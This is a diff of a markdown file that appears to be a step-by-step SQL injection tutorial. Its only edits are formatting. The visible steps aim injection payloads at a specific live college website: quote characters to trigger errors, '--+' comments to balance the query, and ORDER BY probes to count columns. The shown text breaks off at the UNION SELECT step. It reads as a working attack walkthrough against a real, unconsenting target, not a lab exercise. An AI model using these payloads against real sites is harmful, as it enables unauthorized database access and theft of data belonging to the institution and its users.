@@ -25,17 +25,17 @@ For instance: https://www.hicas.ac.in/pg-course?link=mca
 ## STEP 2 - Generate an Error Using This URL
 To test for errors, experiment with various input values:
 
-Alphanumeric Values /n
+Alphanumeric Values <br>
 Example: https://www.hicas.ac.in/pg-course?link=abcd1234
 
-Large Numbers
+Large Numbers <br>
 Example: https://www.hicas.ac.in/pg-course?link=999999999999
 
-Special Characters
-Try symbols like ', ", #, %, &, *, -, and +.
+Special Characters <br>
+Try symbols like ', ", #, %, &, *, -, and +. <br>
 Example: https://www.hicas.ac.in/pg-course?link=mca'"
 
-If you see an error like:
+### If you see an error like:
 
 ## STEP 3 - Eliminate the Error to Balance the Query
 Use spacing and comment indicators like --+ to balance the query structure effectively.
@@ -44,10 +44,10 @@ Use spacing and comment indicators like --+ to balance the query structure effec
 
 Insert SQL commands in the space created in Step 4. Start by using ORDER BY to determine the number of columns in the database:
 
-Example: https://www.hicas.ac.in/pg-course?link=mca' order by 31--+
+Example: https://www.hicas.ac.in/pg-course?link=mca' order by 31--+ <br>
 If this produces an error such as Unknown column '31' in 'order clause', reduce the number and test again.
 
-Example: https://www.hicas.ac.in/pg-course?link=mca' order by 30--+
+Example: https://www.hicas.ac.in/pg-course?link=mca' order by 30--+ <br>
 Once you no longer receive an error, you’ll have identified the number of columns—here, 30.
 
 ## STEP 5 - Identify Vulnerable Columns with UNION SELECT
